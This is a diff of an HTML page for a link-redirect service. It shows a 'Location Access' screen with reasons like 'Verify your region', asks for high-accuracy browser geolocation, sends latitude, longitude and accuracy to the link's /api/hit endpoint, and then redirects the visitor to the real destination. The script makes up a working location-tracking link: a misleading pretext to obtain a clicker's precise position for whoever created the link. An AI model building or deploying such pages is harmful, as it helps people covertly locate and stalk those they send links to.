@@ -11,180 +11,210 @@
     box-sizing: border-box;
   }
 
-  html, body {
-    height: 100%;
-    background: #ffffff;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-  }
-
-  /* Full screen container */
-  .container {
+  body {
     min-height: 100vh;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 1.5rem;
+    padding: 20px;
+  }
+
+  .container {
+    max-width: 400px;
+    width: 100%;
   }
 
   .card {
-    max-width: 380px;
-    width: 100%;
-    text-align: center;
     background: white;
     border-radius: 32px;
-    padding: 2rem 1.5rem;
-    box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08);
+    padding: 40px 24px;
+    text-align: center;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    animation: fadeInUp 0.6s ease-out;
   }
 
-  /* Location icon animation */
-  .location-icon {
-    width: 80px;
-    height: 80px;
-    margin: 0 auto 1.5rem;
-    background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+  @keyframes fadeInUp {
+    from {
+      opacity: 0;
+      transform: translateY(30px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .icon-wrapper {
+    width: 100px;
+    height: 100px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
-    animation: pulse 2s ease-in-out infinite;
-    box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.3);
-  }
-
-  .location-icon svg {
-    width: 40px;
-    height: 40px;
-    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    margin: 0 auto 24px;
+    animation: pulse 2s infinite;
   }
 
   @keyframes pulse {
     0%, 100% {
       transform: scale(1);
-      box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.3);
+      box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.4);
     }
     50% {
       transform: scale(1.05);
-      box-shadow: 0 20px 35px -8px rgba(99, 102, 241, 0.5);
+      box-shadow: 0 0 0 20px rgba(102, 126, 234, 0);
     }
   }
 
-  h2 {
-    font-size: 1.5rem;
-    font-weight: 700;
-    color: #111827;
-    margin-bottom: 0.75rem;
+  .icon-wrapper svg {
+    width: 50px;
+    height: 50px;
+    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
   }
 
-  .description {
+  h1 {
+    font-size: 1.75rem;
+    color: #1f2937;
+    margin-bottom: 12px;
+    font-weight: 700;
+  }
+
+  .subtitle {
     color: #6b7280;
     font-size: 0.95rem;
     line-height: 1.5;
-    margin-bottom: 1.5rem;
+    margin-bottom: 28px;
   }
 
-  .benefits {
+  .info-box {
     background: #f3f4f6;
-    border-radius: 20px;
-    padding: 1rem;
-    margin-bottom: 1.75rem;
+    border-radius: 16px;
+    padding: 16px;
+    margin-bottom: 28px;
     text-align: left;
   }
 
-  .benefit-item {
+  .info-item {
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 12px;
     padding: 8px 0;
-    font-size: 0.85rem;
     color: #374151;
+    font-size: 0.9rem;
   }
 
-  .benefit-item::before {
+  .info-item::before {
     content: "✓";
-    color: #6366f1;
+    color: #667eea;
     font-weight: bold;
-    font-size: 1rem;
+    font-size: 1.1rem;
   }
 
-  /* The ALLOW button - clicking this triggers browser's native location popup */
-  .allow-native-btn {
+  /* This button will trigger the browser's native location popup */
+  .primary-btn {
     width: 100%;
-    padding: 1rem;
-    background: #6366f1;
+    padding: 16px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     color: white;
     border: none;
     border-radius: 60px;
     font-size: 1rem;
     font-weight: 600;
     cursor: pointer;
+    transition: all 0.3s ease;
+    margin-bottom: 12px;
+    font-family: inherit;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .primary-btn:active {
+    transform: scale(0.98);
+  }
+
+  .secondary-btn {
+    width: 100%;
+    padding: 12px;
+    background: transparent;
+    color: #9ca3af;
+    border: 1px solid #e5e7eb;
+    border-radius: 60px;
+    font-size: 0.9rem;
+    cursor: pointer;
     transition: all 0.2s ease;
     font-family: inherit;
-    margin-bottom: 1rem;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
   }
 
-  .allow-native-btn:active {
-    transform: scale(0.98);
-    background: #4f52e0;
+  .secondary-btn:active {
+    background: #f9fafb;
   }
 
-  .skip-link {
-    background: none;
-    border: none;
-    color: #9ca3af;
+  .status {
+    margin-top: 20px;
+    padding: 12px;
+    border-radius: 12px;
     font-size: 0.85rem;
-    cursor: pointer;
-    text-decoration: underline;
-    padding: 0.5rem;
+    display: none;
   }
 
-  .status-message {
-    margin-top: 1rem;
-    font-size: 0.8rem;
-    color: #10b981;
-    min-height: 2rem;
+  .status.show {
+    display: block;
+    animation: fadeIn 0.3s ease;
   }
 
-  .status-message.error {
-    color: #ef4444;
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
   }
 
-  .status-message.loading {
-    color: #6366f1;
+  .status.success {
+    background: #d1fae5;
+    color: #065f46;
   }
 
-  /* Progress bar */
+  .status.error {
+    background: #fee2e2;
+    color: #991b1b;
+  }
+
+  .status.info {
+    background: #e0e7ff;
+    color: #3730a3;
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 0.6s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
   .progress-bar {
     position: fixed;
     top: 0;
     left: 0;
     height: 3px;
-    background: linear-gradient(90deg, #6366f1, #8b5cf6, #6366f1);
+    background: linear-gradient(90deg, #667eea, #764ba2);
     width: 0%;
     transition: width 0.3s ease;
     z-index: 1000;
   }
 
-  /* Hide elements when needed */
-  .hidden {
-    display: none;
-  }
-
-  /* Spinner */
-  .spinner {
-    display: inline-block;
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-radius: 50%;
-    border-top-color: white;
-    animation: spin 0.6s linear infinite;
-  }
-
-  @keyframes spin {
-    to { transform: rotate(360deg); }
+  button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
   }
 </style>
 </head>
@@ -192,241 +222,244 @@
 <div class="progress-bar" id="progressBar"></div>
 <div class="container">
   <div class="card">
-    <div class="location-icon">
+    <div class="icon-wrapper">
       <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
-        <circle cx="12" cy="9" r="2.5" fill="white" stroke="white" />
+        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/>
+        <circle cx="12" cy="9" r="2.5" fill="white" stroke="white"/>
       </svg>
     </div>
-    <h2>Share your location</h2>
-    <p class="description">
-      To continue, please allow location access when prompted by your browser.
-    </p>
-    <div class="benefits">
-      <div class="benefit-item">Regional content verification</div>
-      <div class="benefit-item">Personalized experience</div>
-      <div class="benefit-item">Secure and private</div>
-    </div>
+    <h1>Location Access</h1>
+    <p class="subtitle">Please allow location access to continue to your destination</p>
     
+    <div class="info-box">
+      <div class="info-item">Verify your region</div>
+      <div class="info-item">Access local content</div>
+      <div class="info-item">Improve your experience</div>
+    </div>
+
     <!-- 
       CRITICAL FIX: 
-      This button triggers the browser's NATIVE location permission popup.
-      No extra "Allow" button inside the page - the browser handles it directly.
-      The user clicks this, browser shows "Allow/Block" popup, then we proceed.
+      Clicking this button triggers the browser's NATIVE location permission popup.
+      The popup says "Allow" or "Block" - that's where user gives permission.
     -->
-    <button class="allow-native-btn" id="requestLocationBtn">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-        <path d="M12 2v4M12 22v-4M4.93 4.93l2.83 2.83M19.07 19.07l-2.83-2.83M2 12h4M22 12h-4M4.93 19.07l2.83-2.83M19.07 4.93l-2.83 2.83"/>
-        <circle cx="12" cy="12" r="3"/>
-      </svg>
-      Continue with Location
+    <button class="primary-btn" id="allowLocationBtn">
+      Allow Location Access
     </button>
     
-    <button class="skip-link" id="skipBtn">Continue without location →</button>
-    <div class="status-message" id="statusMsg"></div>
+    <button class="secondary-btn" id="continueWithoutBtn">
+      Continue without location
+    </button>
+    
+    <div class="status" id="status"></div>
   </div>
 </div>
 
 <script>
-  (function() {
-    // Get link ID from URL
-    const linkId = window.location.pathname.split('/').pop() || 'default';
-    let destUrl = 'https://google.com';
-    let locationSent = false;
-    let isRedirecting = false;
-    let locationRequested = false;
-    
-    const progressBar = document.getElementById('progressBar');
-    const requestBtn = document.getElementById('requestLocationBtn');
-    const skipBtn = document.getElementById('skipBtn');
-    const statusMsg = document.getElementById('statusMsg');
-    
-    // Progress bar helper
-    function setProgress(width, duration = 300) {
-      if (isRedirecting) return;
-      progressBar.style.transition = `width ${duration}ms ease`;
-      progressBar.style.width = width + '%';
-    }
-    
-    // Initial progress animation
-    setProgress(15, 500);
-    setTimeout(() => setProgress(30, 400), 600);
-    setTimeout(() => setProgress(45, 300), 1200);
-    
-    // Fetch destination URL
+(function() {
+  // Get link ID from URL
+  const linkId = window.location.pathname.split('/').pop() || '';
+  let destinationUrl = 'https://google.com';
+  let isProcessing = false;
+  let locationSent = false;
+  let redirecting = false;
+  
+  const progressBar = document.getElementById('progressBar');
+  const allowBtn = document.getElementById('allowLocationBtn');
+  const continueBtn = document.getElementById('continueWithoutBtn');
+  const statusDiv = document.getElementById('status');
+  
+  // Progress bar helper
+  function updateProgress(percent, duration = 300) {
+    if (redirecting) return;
+    progressBar.style.transition = `width ${duration}ms ease`;
+    progressBar.style.width = percent + '%';
+  }
+  
+  // Show status message
+  function showStatus(message, type = 'info') {
+    statusDiv.textContent = message;
+    statusDiv.className = `status show ${type}`;
+    setTimeout(() => {
+      if (statusDiv.textContent === message) {
+        statusDiv.classList.remove('show');
+      }
+    }, 3000);
+  }
+  
+  // Initial progress
+  updateProgress(20, 400);
+  
+  // Fetch destination URL from API
+  if (linkId) {
     fetch('/api/hits/' + linkId)
       .then(r => r.json())
       .then(data => {
-        if (data && data.dest) destUrl = data.dest;
-        setProgress(55, 300);
+        if (data && data.dest) destinationUrl = data.dest;
+        updateProgress(40, 300);
       })
       .catch(() => {
-        setProgress(55, 300);
+        updateProgress(40, 300);
       });
+  } else {
+    updateProgress(40, 300);
+  }
+  
+  setTimeout(() => updateProgress(55, 300), 800);
+  
+  // Send location data to backend
+  function sendLocationToServer(lat, lon, accuracy, errorType = null) {
+    if (locationSent) return;
+    locationSent = true;
     
-    // Send location data to backend
-    function sendLocation(lat, lon, acc, errorType = null) {
-      if (locationSent) return;
-      locationSent = true;
-      
-      const payload = {
-        lat: lat || null,
-        lon: lon || null,
-        acc: acc || null,
-        error: errorType,
-        timestamp: Date.now(),
-        linkId: linkId
-      };
-      
-      fetch('/api/hit/' + linkId, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(err => console.warn('Failed to send location:', err));
-    }
+    const payload = {
+      lat: lat || null,
+      lon: lon || null,
+      accuracy: accuracy || null,
+      error: errorType,
+      timestamp: Date.now(),
+      linkId: linkId || 'unknown'
+    };
     
-    // Redirect to destination
-    function redirect() {
-      if (isRedirecting) return;
-      isRedirecting = true;
-      setProgress(100, 400);
-      setTimeout(() => {
-        window.location.href = destUrl;
-      }, 400);
-    }
-    
-    // ============================================================
-    // CORE FIX: Request location using browser's NATIVE popup
-    // ============================================================
-    function requestNativeLocation() {
-      // Prevent multiple requests
-      if (locationRequested || isRedirecting) return;
-      locationRequested = true;
-      
-      // Check if geolocation is supported
-      if (!navigator.geolocation) {
-        statusMsg.textContent = "⚠️ Geolocation not supported. Redirecting...";
-        statusMsg.className = "status-message error";
-        sendLocation(null, null, null, 'not_supported');
-        setTimeout(() => redirect(), 800);
-        return;
-      }
-      
-      // Update UI to show we're waiting for browser popup
-      statusMsg.innerHTML = '<span class="spinner"></span> Waiting for your permission...';
-      statusMsg.className = "status-message loading";
-      setProgress(70, 400);
-      
-      // This triggers the BROWSER'S NATIVE ALLOW/BLOCK POPUP
-      // The popup appears automatically - user clicks "Allow" or "Block" directly in the browser
-      navigator.geolocation.getCurrentPosition(
-        function onLocationSuccess(position) {
-          // User clicked ALLOW in the browser popup
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          const accuracy = Math.round(position.coords.accuracy || 0);
-          
-          statusMsg.textContent = "✓ Location verified! Redirecting...";
-          statusMsg.className = "status-message";
-          setProgress(90, 300);
-          
-          sendLocation(lat, lng, accuracy, null);
-          redirect();
-        },
-        function onLocationError(error) {
-          // User clicked BLOCK in browser popup, or error occurred
-          let errorText = "";
-          let errorType = "";
-          
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              errorText = "❌ Location access blocked. You can continue without location.";
-              errorType = "denied";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              errorText = "⚠️ Position unavailable. Continuing without location.";
-              errorType = "unavailable";
-              break;
-            case error.TIMEOUT:
-              errorText = "⏱️ Location request timed out. Continuing...";
-              errorType = "timeout";
-              break;
-            default:
-              errorText = "⚠️ Could not get location. Continuing anyway.";
-              errorType = "unknown";
-          }
-          
-          statusMsg.textContent = errorText;
-          statusMsg.className = "status-message error";
-          setProgress(80, 300);
-          
-          sendLocation(null, null, null, errorType);
-          // Wait a moment so user can read the message
-          setTimeout(() => redirect(), 1200);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    }
-    
-    // ============================================================
-    // BUTTON CLICK HANDLER - This is the ONLY way to trigger location
-    // When user clicks "Continue with Location", we call requestNativeLocation()
-    // which triggers the browser's native permission popup.
-    // No extra in-page "Allow" button needed!
-    // ============================================================
-    requestBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      
-      if (isRedirecting || locationRequested) return;
-      
-      // Disable button to prevent double clicks
-      requestBtn.disabled = true;
-      requestBtn.style.opacity = '0.7';
-      requestBtn.style.cursor = 'wait';
-      requestBtn.innerHTML = '<span class="spinner"></span> Requesting permission...';
-      
-      // Trigger browser's native location popup
-      requestNativeLocation();
-    });
-    
-    // Skip button handler
-    skipBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      
-      if (isRedirecting) return;
-      
-      skipBtn.disabled = true;
-      statusMsg.textContent = "Skipping location check...";
-      statusMsg.className = "status-message";
-      setProgress(85, 300);
-      
-      sendLocation(null, null, null, 'skipped');
-      redirect();
-    });
-    
-    // Safety timeout: if something hangs for 20 seconds, force redirect
+    fetch('/api/hit/' + (linkId || 'unknown'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(err => console.warn('Failed to send:', err));
+  }
+  
+  // Redirect to destination
+  function redirectToDestination() {
+    if (redirecting) return;
+    redirecting = true;
+    updateProgress(100, 400);
     setTimeout(() => {
-      if (!isRedirecting && !locationSent) {
-        console.log("Safety timeout - forcing redirect");
-        sendLocation(null, null, null, 'safety_timeout');
-        redirect();
-      }
-    }, 20000);
+      window.location.href = destinationUrl;
+    }, 400);
+  }
+  
+  // ============================================================
+  // MAIN FUNCTION: Request location with browser's native popup
+  // ============================================================
+  function requestLocationWithNativePopup() {
+    if (isProcessing || redirecting) return;
+    isProcessing = true;
     
-    // If geolocation is not available at all, modify UI
+    // Check if geolocation is supported
     if (!navigator.geolocation) {
-      requestBtn.disabled = true;
-      requestBtn.style.opacity = '0.5';
-      requestBtn.style.cursor = 'not-allowed';
-      requestBtn.innerHTML = 'Geolocation Not Supported';
-      statusMsg.textContent = "Your browser doesn't support location services. Use 'Continue without location'.";
-      statusMsg.className = "status-message error";
+      showStatus('Geolocation is not supported by your browser', 'error');
+      sendLocationToServer(null, null, null, 'not_supported');
+      setTimeout(() => redirectToDestination(), 1500);
+      return;
     }
-  })();
+    
+    // Disable button while processing
+    allowBtn.disabled = true;
+    allowBtn.innerHTML = '<span class="spinner"></span> Requesting permission...';
+    updateProgress(70, 300);
+    showStatus('Waiting for your permission in the browser popup...', 'info');
+    
+    // THIS TRIGGERS THE BROWSER'S NATIVE LOCATION POPUP
+    // The popup will appear with "Allow" and "Block" buttons
+    navigator.geolocation.getCurrentPosition(
+      // SUCCESS: User clicked ALLOW in the browser popup
+      function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = Math.round(position.coords.accuracy || 0);
+        
+        showStatus('✓ Location access granted! Redirecting...', 'success');
+        updateProgress(90, 300);
+        
+        sendLocationToServer(latitude, longitude, accuracy, null);
+        redirectToDestination();
+      },
+      // ERROR: User clicked BLOCK or there was an error
+      function(error) {
+        let errorMessage = '';
+        let errorType = '';
+        
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            errorMessage = 'Location access was blocked. You can continue without location.';
+            errorType = 'denied';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMessage = 'Location information is unavailable. Continuing...';
+            errorType = 'unavailable';
+            break;
+          case error.TIMEOUT:
+            errorMessage = 'Location request timed out. Continuing without location.';
+            errorType = 'timeout';
+            break;
+          default:
+            errorMessage = 'Could not get your location. Continuing anyway.';
+            errorType = 'unknown';
+        }
+        
+        showStatus(errorMessage, 'error');
+        updateProgress(80, 300);
+        
+        sendLocationToServer(null, null, null, errorType);
+        
+        // Reset button state
+        allowBtn.disabled = false;
+        allowBtn.innerHTML = 'Allow Location Access';
+        isProcessing = false;
+        
+        // Redirect after showing message
+        setTimeout(() => redirectToDestination(), 2000);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  }
+  
+  // ============================================================
+  // BUTTON CLICK - This is the user gesture that triggers the popup
+  // ============================================================
+  allowBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    if (!isProcessing && !redirecting) {
+      requestLocationWithNativePopup();
+    }
+  });
+  
+  // Continue without location
+  continueBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    if (redirecting) return;
+    
+    continueBtn.disabled = true;
+    showStatus('Continuing without location access...', 'info');
+    updateProgress(85, 300);
+    
+    sendLocationToServer(null, null, null, 'skipped');
+    redirectToDestination();
+  });
+  
+  // Safety timeout - if something goes wrong, redirect after 15 seconds
+  setTimeout(() => {
+    if (!redirecting && !locationSent) {
+      console.log('Safety timeout triggered');
+      sendLocationToServer(null, null, null, 'timeout');
+      redirectToDestination();
+    }
+  }, 15000);
+  
+  // Check if geolocation is available at all
+  if (!navigator.geolocation) {
+    allowBtn.disabled = true;
+    allowBtn.style.opacity = '0.5';
+    allowBtn.innerHTML = 'Geolocation Not Supported';
+    showStatus('Your browser does not support geolocation', 'error');
+  }
+  
+  // For debugging
+  console.log('Page loaded. Click the button to trigger browser location popup.');
+})();
 </script>
 </body>
 </html>
